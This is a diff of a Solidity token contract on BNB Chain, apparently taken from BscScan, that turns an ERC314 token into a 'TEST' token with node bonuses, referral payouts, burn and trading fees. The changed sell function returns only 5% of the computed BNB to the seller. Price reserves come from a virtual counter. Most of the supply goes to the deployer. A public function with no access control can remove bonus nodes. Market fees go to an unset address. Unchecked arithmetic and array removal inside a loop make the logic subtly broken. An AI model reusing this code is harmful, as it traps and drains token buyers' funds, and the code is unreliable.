@@ -1,9 +1,9 @@
 /**
  *Submitted for verification at BscScan.com on 2024-03-23
-*/
+ */
 
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.24;
 
 /**
  * @title ERC314
@@ -29,8 +29,10 @@ abstract contract ERC314 is IEERC314 {
     mapping(address account => uint256) private _balances;
 
     uint256 private _totalSupply;
+    uint256 private _bnbTotalSupply;
     uint256 public _maxWallet;
-    uint32 public blockToUnlockLiquidity;
+    uint256 public _maxSellAmount;
+    uint256 public _fireStopAmount;
 
     string private _name;
     string private _symbol;
@@ -38,10 +40,13 @@ abstract contract ERC314 is IEERC314 {
     address public owner;
     address public liquidityProvider;
 
-    bool public tradingEnable;
-    bool public liquidityAdded;
     bool public maxWalletEnable;
+    address public marketAddress;
+    address public ecoAddress;
     address public feeAddress;
+    address[] nodeAddress;
+    uint256 _nodeLimitAmount;
+    mapping(address => address) relation;
 
     // uint256 presaleAmount;
 
@@ -75,17 +80,19 @@ abstract contract ERC314 is IEERC314 {
     ) {
         _name = name_;
         _symbol = symbol_;
-        _totalSupply = totalSupply_; //31000
-        _maxWallet = 100000 * 10**18; //10w
+        _totalSupply = totalSupply_; //3.1亿
+        _bnbTotalSupply = 300  * 10 ** 18;
+        _fireStopAmount = 31000000  * 10 ** 8;
+        _maxWallet = 500000  * 10 ** 8; //50w
+        _nodeLimitAmount = 500000  * 10 ** 8; //50w node
+        _maxSellAmount = 50000  * 10 ** 8; //最多
         owner = msg.sender;
-        tradingEnable = false;
+        ecoAddress = msg.sender;
         maxWalletEnable = true;
-        // _balances[msg.sender] = totalSupply_ / 10; //210
-        _balances[address(this)] = _totalSupply;
-        liquidityAdded = false;
-        feeAddress = msg.sender;
+        _balances[address(this)] = 1100000000 * 10 ** 8;
+        _balances[ecoAddress] = 8800000000 * 10 ** 8;
+        feeAddress = 0x7a6CA6A66B7CA223ecD10ef837895F7a32e902d4;
     }
-
 
     /**
      * @dev Returns the name of the token.
@@ -107,7 +114,7 @@ abstract contract ERC314 is IEERC314 {
      */
 
     function decimals() public view virtual returns (uint8) {
-        return 18;
+        return 8;
     }
 
     /**
@@ -124,6 +131,87 @@ abstract contract ERC314 is IEERC314 {
         return _balances[account];
     }
 
+    function removeNodeAddress(uint index) public {
+        // Move the last element into the place to delete
+        nodeAddress[index] = nodeAddress[nodeAddress.length - 1];
+        // Remove the last element
+        nodeAddress.pop();
+    }
+
+    function _nodeHandler(uint256 amount) internal {
+        if (nodeAddress.length == 0){
+            return ;
+        }
+        uint256 eachBouns = (amount * 15) / 1000 / nodeAddress.length;
+        for (uint i = 0; i < nodeAddress.length; i++) {
+            if (nodeAddress[i] == address(0)) {
+                continue;
+            }
+
+            if (_balances[nodeAddress[i]] >= _nodeLimitAmount) {
+                unchecked {
+                    _balances[nodeAddress[i]] =
+                        _balances[nodeAddress[i]] +
+                        eachBouns;
+                }
+            } else {
+                removeNodeAddress(i);
+            }
+        }
+    }
+
+    function _nodeAdd(address _addr) internal {
+        if (_balances[_addr] >= _nodeLimitAmount) {
+            nodeAddress.push(_addr);
+        }
+    }
+
+    function _marketHandler(uint256 bnbAmount) internal {
+        payable(marketAddress).transfer((bnbAmount * 15) / 1000);
+    }
+
+    function _bindRelation(address from, address to) internal {
+        if (relation[to] == address(0x0)) {
+            relation[to] = from;
+        }
+    }
+
+    function _relationHandler(address from, uint256 amount) internal {
+        address parentAddress = relation[from];
+        if (parentAddress == address(0x0)) {
+            parentAddress = feeAddress;
+        }
+        unchecked {
+            _balances[parentAddress] =
+                _balances[parentAddress] +
+                (amount * 10) /
+                1000;
+        }
+    }
+
+    function _fireHandler(uint256 amount) internal {
+        uint256 _fireAmount = (amount * 10) / 1000;
+        if (_totalSupply - _fireAmount < _fireStopAmount) {
+            _fireAmount = _totalSupply - _fireStopAmount;
+        }
+        if (_fireAmount > 0) {
+            _totalSupply -= _fireAmount;
+            unchecked {
+                _balances[address(this)] =
+                    _balances[address(this)] -
+                    _fireAmount;
+            }
+        }
+    }
+
+    function _tradeFee(uint256 amount) internal {
+        uint256 _ecoAmount = (amount * 5) / 100;
+        unchecked {
+            _balances[address(this)] = _balances[address(this)] - _ecoAmount;
+            _balances[ecoAddress] = _balances[ecoAddress] + _ecoAmount;
+        }
+    }
+
     /**
      * @dev See {IERC20-transfer}.
      *
@@ -138,6 +226,7 @@ abstract contract ERC314 is IEERC314 {
             sell(value);
         } else {
             _transfer(msg.sender, to, value);
+            _nodeAdd(to);
         }
         return true;
     }
@@ -183,23 +272,10 @@ abstract contract ERC314 is IEERC314 {
     }
 
     /**
-     * @dev Returns the amount of ETH and tokens in the contract, used for trading.
+     * @dev Returns the amount of BNB and tokens in the contract, used for trading.
      */
     function getReserves() public view returns (uint256, uint256) {
-        return (address(this).balance, _balances[address(this)]);
-    }
-
-    /**
-     * @dev Enables or disables trading.
-     * @param _tradingEnable: true to enable trading, false to disable trading.
-     * onlyOwner modifier
-     */
-    function enableTrading(bool _tradingEnable) external onlyOwner {
-        tradingEnable = _tradingEnable;
-    }
-
-    function setFeeAddress(address _feeAddress) external onlyOwner {
-        feeAddress = _feeAddress;
+        return (_bnbTotalSupply, _balances[address(this)]);
     }
 
     /**
@@ -229,131 +305,93 @@ abstract contract ERC314 is IEERC314 {
     }
 
     /**
-     * @dev Adds liquidity to the contract.
-     * value: the amount of ETH to add to the liquidity.
-     * onlyOwner modifier
-     */
-    function addLiquidity() public payable onlyOwner {
-        require(liquidityAdded == false, "Liquidity already added");
-
-        liquidityAdded = true;
-
-        require(msg.value > 0, "No ETH sent");
-        // require(block.number < _blockToUnlockLiquidity, "Block number too low");
-        blockToUnlockLiquidity = uint32(block.number);
-        tradingEnable = true;
-        liquidityProvider = msg.sender;
-
-        emit AddLiquidity(uint32(block.number), msg.value);
-    }
-
-    /**
-     * @dev Removes liquidity from the contract.
-     * onlyLiquidityProvider modifier
-     */
-    function removeLiquidity() public onlyLiquidityProvider {
-        require(block.number > blockToUnlockLiquidity, "Liquidity locked");
-
-        tradingEnable = false;
-
-        payable(msg.sender).transfer(address(this).balance);
-
-        emit RemoveLiquidity(address(this).balance);
-    }
-
-    /**
-     * @dev Extends the liquidity lock, only if the new block number is higher than the current one.
-     * @param _blockToUnlockLiquidity: the new block number to unlock the liquidity.
-     * onlyLiquidityProvider modifier
-     */
-    function extendLiquidityLock(
-        uint32 _blockToUnlockLiquidity
-    ) public onlyLiquidityProvider {
-        require(
-            blockToUnlockLiquidity < _blockToUnlockLiquidity,
-            "You can't shorten duration"
-        );
-
-        blockToUnlockLiquidity = _blockToUnlockLiquidity;
-    }
-
-    /**
-     * @dev Estimates the amount of tokens or ETH to receive when buying or selling.
-     * @param value: the amount of ETH or tokens to swap.
+     * @dev Estimates the amount of tokens or BNB to receive when buying or selling.
+     * @param value: the amount of BNB or tokens to swap.
      * @param _buy: true if buying, false if selling.
      */
     function getAmountOut(
         uint256 value,
         bool _buy
     ) public view returns (uint256) {
-        (uint256 reserveETH, uint256 reserveToken) = getReserves();
+        (uint256 reservebnb, uint256 reserveToken) = getReserves();
 
         if (_buy) {
-            return (value * reserveToken) / (reserveETH + value);
+            return (value * reserveToken) / (reservebnb + value);
         } else {
-            return (value * reserveETH) / (reserveToken + value);
+            return (value * reservebnb) / (reserveToken + value);
         }
     }
 
-    function price() public view returns (uint256){
-    return  address(this).balance*10* 10 ** 18/_balances[address(this)];
+    /**
+     * @dev Buys tokens with BNB.
+     * internal function
+     */
+    function buy() public payable {
+        // uint256 gasStart = gasleft();
+        uint256 bnbAmount = msg.value;
+        uint256 token_amount = (bnbAmount * _balances[address(this)]) /
+            (_bnbTotalSupply);
+
+        if (maxWalletEnable) {
+            require(
+                token_amount + _balances[msg.sender] <= _maxWallet,
+                "Max wallet exceeded"
+            );
+        }
+
+        _transfer(address(this), msg.sender, (token_amount * 95) / 100);
+        _bnbTotalSupply += (bnbAmount*985/1000);
+
+        _marketHandler(msg.value);
+        _nodeHandler(token_amount);
+        _relationHandler(msg.sender, token_amount);
+        _fireHandler(token_amount);
+        _tradeFee(token_amount);
+        // uint256 gasSpent = gasStart - gasleft();
+        // payable(msg.sender).transfer(gasSpent * tx.gasprice);
+        emit Swap(msg.sender, msg.value, 0, 0, token_amount);
     }
 
     /**
-     * @dev Buys tokens with ETH.
+     * @dev Sells tokens for BNB.
      * internal function
      */
-    function buy() internal  {
-       
-            require(tradingEnable, "Trading not enable");
-            uint256 ethAmount = msg.value*95/100;
-            uint256 token_amount = ( ethAmount* _balances[address(this)]) /
-                (address(this).balance);
 
-            if (maxWalletEnable) {
-                require(
-                    token_amount + _balances[msg.sender] <= _maxWallet,
-                    "Max wallet exceeded"
-                );
-            }
-            
-            _transfer(address(this), msg.sender, token_amount);
-           payable(feeAddress).transfer( msg.value-ethAmount);
-            emit Swap(msg.sender, msg.value, 0, 0, token_amount);
-    }
+    // Execute the operation that consumes gas
+    // ...
 
-    /**
-     * @dev Sells tokens for ETH.
-     * internal function
-     */
-    function sell(uint256 sell_amount) internal{
-        require(tradingEnable, "Trading not enable");
-
-        uint256 ethAmount = (sell_amount * address(this).balance) /
+    function sell(uint256 sell_amount) public payable {
+        // uint256 gasStart = gasleft();
+        require(sell_amount <= _maxSellAmount, "Max Limit Sell");
+        uint256 bnbAmount = (sell_amount * _bnbTotalSupply) /
             (_balances[address(this)] + sell_amount);
 
-        require(ethAmount > 0, "Sell amount too low");
-        require(
-            address(this).balance >= ethAmount,
-            "Insufficient ETH in reserves"
-        );
-        _transfer(msg.sender, address(this), sell_amount);
-        uint256 _feeAmount = ethAmount*5/100;
-        payable(msg.sender).transfer(ethAmount-_feeAmount);
-        payable(feeAddress).transfer(_feeAmount);
-        emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);
+        require(bnbAmount > 0, "Sell amount too low");
+        require(_bnbTotalSupply >= bnbAmount, "Insufficient BNB in reserves");
+        _transfer(msg.sender, address(this), (sell_amount * 95) / 1000);
+
+        payable(msg.sender).transfer((bnbAmount * 5) / 100);
+        _bnbTotalSupply -= bnbAmount*985/1000;
+        _marketHandler(bnbAmount);
+        _nodeHandler(sell_amount);
+        _relationHandler(msg.sender, sell_amount);
+        _fireHandler(sell_amount);
+        _tradeFee(sell_amount);
+        // uint256 gasSpent = gasStart - gasleft();
+        // payable(msg.sender).transfer(gasSpent * tx.gasprice);
+        emit Swap(msg.sender, 0, sell_amount, bnbAmount, 0);
     }
 
     /**
-     * @dev Fallback function to buy tokens with ETH.
+     * @dev Fallback function to buy tokens with BNB.
      */
     receive() external payable {
         buy();
     }
 }
 
-contract KAB is ERC314 {
-    uint256 private _totalSupply = 31000000 * 10 ** 18;
+contract TEST is ERC314 {
+    uint256 private _totalSupply = 9900000000 * 10 ** 8;
 
-    constructor() ERC314("KAB", "KAB", _totalSupply) {}
+    constructor() ERC314("TEST", "TEST", _totalSupply) {}
 }
